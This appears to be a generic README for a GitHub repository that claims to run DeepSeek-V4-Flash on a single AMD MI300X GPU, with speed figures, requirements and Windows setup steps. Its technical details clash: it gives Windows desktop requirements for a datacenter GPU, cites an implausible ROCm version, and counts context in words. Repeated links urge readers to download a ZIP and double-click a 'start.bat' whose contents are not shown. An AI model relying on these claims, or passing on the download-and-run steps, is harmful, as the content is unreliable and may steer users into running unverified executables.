# 💻 deepseek-v4-flash-mi300x - Run DeepSeek V4 on One AMD GPU

[![Download](https://img.shields.io/badge/Download-Repository-FF6F00?style=for-the-badge&logo=github)](https://github.com/mickiecretaceous24/deepseek-v4-flash-mi300x)

## 🚀 Overview

This project lets you run the **DeepSeek-V4-Flash** AI model on a single AMD MI300X graphics card. No need for multiple GPUs or complex setup. Everything is pre-configured and tested to work out of the box.

## 🎯 What You Can Do

- Run a powerful AI assistant locally on your computer
- Process text quickly with fast response times
- Handle up to 256,000 words of context in one session
- Support multiple users at the same time

## ⚙️ How It Works

The repository includes ready-to-use files for Docker containers. It uses the latest ROCm software (version 0.26.1) and AITER (0.1.19) to get the best performance from your AMD MI300X.

### Performance Numbers

| Feature | Speed |
| --- | ---: |
| Single user response | 168.6 tokens per second |
| Initial text processing | 7,900-8,500 tokens per second |
| 8 users at once | 542 tokens per second total |
| 64 users burst | 830 tokens per second |
| Memory used | 156.67 GB in GPU RAM |

## 📥 Getting Started

[Visit this link to download the application.](https://github.com/mickiecretaceous24/deepseek-v4-flash-mi300x)

### What You Need

- **Hardware:** AMD MI300X GPU (one card)
- **Software:** Windows 10 or 11 (64-bit)
- **Storage:** At least 200 GB free space
- **Memory:** 64 GB system RAM recommended

## 📖 Step-by-Step Setup

### 1. Download the Files

1. Click the big download button above
2. On the GitHub page, click the green "Code" button
3. Select "Download ZIP"
4. Save the ZIP file to your computer

### 2. Install Docker

1. Download Docker Desktop from docker.com
2. Install it like any other program
3. Restart your computer after installation

### 3. Run the Application

1. Extract the ZIP file you downloaded
2. Open the extracted folder
3. Double-click the "start.bat" file (if included) or open a command prompt in the folder
4. Type `docker-compose up -d` and press Enter
5. Wait for the installation to finish (may take 10-20 minutes)

### 4. Access the AI

1. Open your web browser
2. Go to `http://localhost:8000`
3. Start typing your questions

## 🛠️ Troubleshooting

### Common Issues

**"Cannot find GPU"**
- Make sure your AMD MI300X is properly installed
- Update your GPU drivers from AMD's website

**"Out of memory"**
- Close other programs that use a lot of memory
- Reduce the number of concurrent users

**"Docker won't start"**
- Enable virtualization in your BIOS
- Make sure Windows Hyper-V is turned on

## 🔧 Configuration Options

You can adjust these settings in the `config.yaml` file:

- **Max users:** Change the number of simultaneous connections
- **Context length:** Set how much text the AI remembers
- **Response speed:** Balance between speed and accuracy

## 📊 Performance Tips

- Use a fast SSD for the model files
- Keep your system drivers updated
- Close unnecessary background programs
- Use wired internet for better stability

## 🤝 Support

If you have problems:

1. Check the "Issues" section on GitHub
2. Search for your problem in existing discussions
3. Open a new issue if needed

## 📝 License

This project uses the MIT license. See the LICENSE file for details.

## ✨ Features

- Single GPU operation
- No special coding required
- Production-ready configuration
- Optimized for AMD hardware
- Docker-based for easy setup
- Supports multiple users

## 🧰 Technical Details

For advanced users, the repository includes:

- Patch files for custom modifications
- Configuration templates
- Performance tuning tables
- Reference diffs against original code

## 🎉 Get Started Today

Download the repository and start running your own AI assistant. It's free, open-source, and ready to use.

[Visit this link to download the application.](https://github.com/mickiecretaceous24/deepseek-v4-flash-mi300x)